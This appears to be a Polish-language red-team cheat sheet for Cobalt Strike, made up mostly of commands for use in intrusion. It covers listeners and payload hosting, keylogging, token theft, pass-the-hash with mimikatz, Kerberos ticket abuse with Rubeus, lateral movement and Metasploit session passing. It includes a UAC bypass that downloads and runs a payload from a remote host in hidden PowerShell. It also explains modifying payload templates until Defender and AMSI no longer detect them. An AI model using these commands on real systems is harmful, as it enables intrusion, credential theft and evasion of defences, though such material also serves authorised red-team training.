# Cobalt Strike

### Słuchacze

### Słuchacze C2

`Cobalt Strike -> Słuchacze -> Dodaj/Edytuj`, a następnie możesz wybrać, gdzie nasłuchiwać, jakiego rodzaju beacon użyć (http, dns, smb...) i wiele więcej.

### Słuchacze Peer2Peer

Beacony tych słuchaczy nie muszą bezpośrednio komunikować się z C2, mogą komunikować się z nim za pośrednictwem innych beaconów.

`Cobalt Strike -> Słuchacze -> Dodaj/Edytuj`, a następnie musisz wybrać beacony TCP lub SMB.

* **Beacon TCP ustawia słuchacz na wybranym porcie**. Aby połączyć się z beaconem TCP, użyj polecenia `connect <ip> <port>` z innego beacona.
* **Beacon SMB nasłuchuje na nazwie potoku o wybranej nazwie**. Aby połączyć się z beaconem SMB, należy użyć polecenia `link [target] [pipe]`.

### Generowanie i hostowanie payloadów

#### Generowanie payloadów w plikach

`Ataki -> Pakiety ->`&#x20;

* **`HTMLApplication`** dla plików HTA
* **`MS Office Macro`** dla dokumentu biurowego z makrem
* **`Windows Executable`** dla pliku .exe, .dll lub pliku usługi .exe
* **`Windows Executable (S)`** dla **bezstrefowego** pliku .exe, .dll lub pliku usługi .exe (lepsze bezstrefowe niż etapowane, mniej IoC)

#### Generowanie i hostowanie payloadów

`Ataki -> Web Drive-by -> Skryptowe dostarczanie przez sieć (S)` Spowoduje to wygenerowanie skryptu/wykonalnego do pobrania beacona z cobalt strike w formatach takich jak: bitsadmin, exe, powershell i python

#### Hostowanie Payloadów

Jeśli już masz plik, który chcesz hostować na serwerze sieciowym, przejdź do `Ataki -> Web Drive-by -> Host File` i wybierz plik do hostowania oraz konfigurację serwera sieciowego.

### Opcje Beacona

<pre class="language-bash"><code class="lang-bash"># Wykonaj lokalny plik .NET
execute-assembly &#x3C;/path/to/executable.exe>

# Zrzuty ekranu
printscreen    # Wykonaj pojedynczy zrzut ekranu za pomocą metody PrintScr
screenshot     # Wykonaj pojedynczy zrzut ekranu
screenwatch    # Wykonuj okresowe zrzuty ekranu pulpitu
## Przejdź do Widok -> Zrzuty ekranu, aby je zobaczyć

# keylogger
keylogger [pid] [x86|x64]
## Wyświetl > Klawisze, aby zobaczyć naciśnięte klawisze

# portscan
portscan [pid] [arch] [cele] [porty] [arp|icmp|none] [maksymalne połączenia] # Wstrzyknij akcję portscanu do innego procesu
portscan [cele] [porty] [arp|icmp|none] [maksymalne połączenia]

# Powershell
# Importuj moduł Powershell
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;wpisz tutaj polecenie powershell>

# Podmiana użytkownika
## Generowanie tokenu z danymi uwierzytelniającymi
make_token [DOMAIN\user] [hasło] # Utwórz token do podmiany użytkownika w sieci
ls \\nazwa_komputera\c$ # Spróbuj użyć wygenerowanego tokenu do dostępu do C$ na komputerze
rev2self # Przestań używać tokenu wygenerowanego za pomocą make_token
## Użycie make_token generuje zdarzenie 4624: Pomyślnie zalogowano na konto. To zdarzenie jest bardzo powszechne w domenie Windows, ale można je zawęzić, filtrować według typu logowania. Jak wspomniano wcześniej, używa LOGON32_LOGON_NEW_CREDENTIALS, który jest typem 9.

# UAC Bypass
elevate svc-exe &#x3C;słuchacz>
elevate uac-token-duplication &#x3C;słuchacz>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Ukradnij token z pid
## Podobnie jak make_token, ale kradnie token z procesu
steal_token [pid] # Ponadto, jest to przydatne dla działań sieciowych, a nie lokalnych
## Z dokumentacji API wiemy, że ten typ logowania "pozwala wywołującemu sklonować jego bieżący token". Dlatego wynik Beacona mówi Impersonated &#x3C;current_username> - podmienia nasz własny sklonowany token.
ls \\nazwa_komputera\c$ # Spróbuj użyć wygenerowanego tokenu do dostępu do C$ na komputerze
rev2self # Przestań używać tokenu z steal_token

## Uruchom proces z nowymi danymi uwierzytelniającymi
spawnas [domena\nazwa_użytkownika] [hasło] [słuchacz] # Zrób to z katalogu z dostępem do odczytu, np. cd C:\
## Podobnie jak make_token, spowoduje to wygenerowanie zdarzenia systemowego 4624: Pomyślnie zalogowano na konto, ale z typem logowania 2 (LOGON32_LOGON_INTERACTIVE). Będzie zawierać szczegóły użytkownika wywołującego (TargetUserName) i podmienionego użytkownika (TargetOutboundUserName).

## Wstrzyknięcie do procesu
inject [pid] [x64|x86] [słuchacz]
## Z punktu widzenia OpSec: Nie wykonuj wstrzykiwania międzyplatformowego, jeśli naprawdę nie musisz (np. x86 -> x64 lub x64 -> x86).

## Przekazanie hasha
## Ten proces modyfikacji wymaga łatania pamięci LSASS, co jest działaniem o wysokim ryzyku, wymaga uprawnień lokalnego administratora i nie jest zbyt wykonalne, jeśli włączono lekki proces chroniony (PPL).
pth [pid] [arch] [DOMAIN\user] [hash NTLM]
pth [DOMAIN\user] [hash NTLM]

## Przekazanie hasha za pomocą mimikatz
mimikatz sekurlsa::pth /user:&#x3C;nazwa_użytkownika> /domain:&#x3C;DOMENA> /ntlm:&#x3C;HASH NTLM> /run:"powershell -w hidden"
## Bez /run, mimikatz uruchamia cmd.exe, jeśli uruchamiasz jako użytkownik z pulpitem, zobaczy powłokę (jeśli uruchamiasz jako SYSTEM, jesteś w porządku)
steal_token &#x3C;pid> #Ukradnij token z procesu utworzonego przez mimikatz

## Przekazanie biletu
## Poproś o bilet
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;nazwa_użytkownika> /domain:&#x3C;domena> /aes256:&#x3C;klucze_aes> /nowrap /opsec
## Utwórz nową sesję logowania do użycia z nowym biletem (aby nie nadpisać skompromitowanego)
make_token &#x3C;domena>\&#x3C;nazwa_użytkownika> DummyPass
## Zapisz bilet na maszynie atakującego z sesji powłoki PowerShell i załaduj go
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...bilet...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Przekazanie biletu z SYSTEMU
## Wygeneruj nowy proces z biletem
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;NAZWA UŻYTKOWNIKA> /domain:&#x3C;DOMENA> /aes256:&#x3C;KLUCZ AES> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Ukradnij token z tego procesu
steal_token &#x3C;pid>

## Wyodrębnij bilet + Przekazanie biletu
### Wyświetl listę biletów
execute-assembly C:\path\Rubeus.exe triage
### Zrzutuj interesujący bilet według luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Utwórz nową sesję logowania, zanotuj luid i processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Wstaw bilet do wygenerowanej sesji logowania
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Na koniec, kradnij token z tego nowego procesu
steal_token &#x3C;pid>

# Ruch boczny
## Jeśli token został utworzony, zostanie użyty
jump [metoda] [cel] [słuchacz]
## Metody:
## psexec                    x86   Użyj usługi do uruchomienia artefaktu Service EXE
## psexec64                  x64   Użyj usługi do uruchomienia artefaktu Service EXE
## psexec_psh                x86   Użyj usługi do uruchomienia jednolinijkowego skryptu PowerShell
## winrm                     x86   Uruchom skrypt PowerShell za pomocą WinRM
## winrm64                   x64   Uruchom skrypt PowerShell za pomocą WinRM

remote-exec [metoda] [cel] [polecenie]
## Metody:
<strong>## psexec                          Wykonaj zdalnie za pomocą Menedżera Kontroli Usług
</strong>## winrm                           Wykonaj zdalnie za pomocą WinRM (PowerShell)
## wmi                             Wykonaj zdalnie za pomocą WMI

## Aby wykonać beacon z wmi (nie jest to w poleceniu jump), po prostu przekaż beacon i wykonaj go
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Przekazanie sesji do Metasploit - Przez słuchacz
## Na hoście metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Na cobalt: Listeners > Dodaj i ustaw Payload na Foreign HTTP. Ustaw Host na 10.10.5.120, Port na 8080 i kliknij Zapisz.
beacon> spawn metasploit
## Możesz uruchamiać tylko sesje x86 Meterpreter z zewnętrznym słuchaczem.

# Przekazanie sesji do Metasploit - Przez wstrzyknięcie shellcode'u
## Na hoście metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Uruchom msfvenom i przygotuj słuchacz multi/handler

## Skopiuj plik bin do hosta cobalt strike
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Wstrzyknij shellcode metasploit do procesu x64

# Przekazanie sesji metasploit do cobalt strike
## Wygeneruj bezetapowy kod Beacon, przejdź do Attacks > Packages > Windows Executable (S), wybierz żądany słuchacz, wybierz Raw jako typ wyjścia i wybierz Użyj ładunku x64.
## Użyj post/windows/manage/shellcode_inject w metasploit, aby wstrzyknąć wygenerowany kod cobalt strike


# Przekierowanie
## Otwórz proxy SOCKS w teamserverze
beacon> socks 1080

# Połączenie SSH
beacon> ssh 10.10.17.12:22 nazwa_użytkownika hasło</code></pre>

## Unikanie programów antywirusowych

### Zestaw artefaktów

Zazwyczaj w `/opt/cobaltstrike/artifact-kit` można znaleźć kod i prekompilowane szablony (w `/src-common`), które cobalt strike będzie używał do generowania binarnych beaconów.

Korzystając z [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) z wygenerowanym backdoor'em (lub tylko z skompilowanym szablonem) można znaleźć, co powoduje uruchomienie defendera. Zazwyczaj jest to ciąg znaków. Dlatego można po prostu zmodyfikować kod generujący backdoor, aby ten ciąg nie pojawił się w końcowym pliku binarnym.

Po zmodyfikowaniu kodu wystarczy uruchomić `./build.sh` z tego samego katalogu i skopiować folder `dist-pipe/` do klienta Windows w `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Nie zapomnij załadować agresywnego skryptu `dist-pipe\artifact.cna`, aby wskazać Cobalt Strike, które zasoby z dysku chcemy używać, a nie te, które są załadowane.

### Zestaw zasobów

Folder ResourceKit zawiera szablony dla skryptowych ładunków Cobalt Strike, w tym PowerShell, VBA i HTA.

Korzystając z [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) z szablonami, możesz dowiedzieć się, co nie podoba się obrońcy (w tym przypadku AMSI) i go zmodyfikować:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modyfikując wykryte linie można wygenerować szablon, który nie zostanie wykryty.

Nie zapomnij załadować agresywnego skryptu `ResourceKit\resources.cna`, aby wskazać Cobalt Strike, aby korzystał z zasobów z dysku, których chcemy, a nie z załadowanych.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

